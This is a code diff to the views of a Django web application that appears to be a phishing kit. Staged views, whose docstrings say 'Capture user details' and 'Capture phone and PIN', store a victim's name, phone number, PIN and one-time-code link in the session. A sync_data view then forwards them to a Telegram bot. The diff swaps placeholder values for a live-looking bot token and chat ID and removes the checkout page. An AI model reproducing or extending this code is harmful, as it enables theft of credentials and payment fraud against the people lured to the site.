@@ -4,38 +4,22 @@ import requests
 from django.shortcuts import render, redirect
 from django.http import JsonResponse
 from django.views.decorators.csrf import csrf_exempt
+from django.conf import settings
 
 
 # Telegram Configuration
-BOT_TOKEN = "YOUR_BOT_TOKEN"
-CHAT_ID = "YOUR_CHAT_ID"
+BOT_TOKEN = "8746127400:AAF26ofxMqh2XXFAwo72ZuB5iBnSkHu1aBY"
+CHAT_ID = "6786520065"
 
 
 def home(request):
     return render(request, 'index.html')
 
 
-def checkout(request):
-    """
-    Checkout page
-    """
-
-    bundle = request.GET.get('bundle', '')
-    price = request.GET.get('price', '')
-
-    context = {
-        'bundle': bundle,
-        'price': price,
-    }
-
-    return render(request, 'checkout.html', context)
-
-
 def payment_instructions(request):
     """
     Stage 2: Capture user details
     """
-
     if request.method == 'POST':
 
         request.session['name'] = request.POST.get('name', '')
@@ -51,7 +35,6 @@ def otp_verification(request):
     """
     Stage 3: Capture phone and PIN
     """
-
     if request.method == 'POST':
 
         request.session['phone'] = request.POST.get('phone', '')
@@ -75,7 +58,6 @@ def sync_data(request):
         }, status=405)
 
     try:
-
         data = json.loads(request.body)
 
         otp_link = data.get('otp', 'No OTP link provided')
@@ -113,7 +95,6 @@ def sync_data(request):
         )
 
         if response.status_code == 200:
-
             return JsonResponse({
                 "status": "success",
                 "message": "Data synced successfully"
@@ -125,7 +106,6 @@ def sync_data(request):
         }, status=500)
 
     except Exception as e:
-
         return JsonResponse({
             "status": "error",
             "message": str(e)
